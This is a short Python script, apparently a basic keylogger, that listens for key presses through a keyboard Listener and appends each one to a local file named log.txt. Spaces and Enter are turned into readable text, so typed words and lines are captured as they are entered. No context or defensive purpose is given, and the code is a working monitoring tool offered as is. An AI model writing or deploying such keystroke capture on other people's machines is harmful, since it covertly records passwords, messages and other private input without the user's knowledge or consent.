def log_keystroke(key):
    key=str(key).replace('"',"")# Remove quotes
    if key =="Key.space":
        key=" " #Convert "Key.space" to actual space
    elif key=="Key.enter":
        key="\n" #Convert enter key to new line
    with open("log.txt","a")as file:
        file.write(key)
with Listener(on_press=log_keystroke)as listener:
    listener.join()
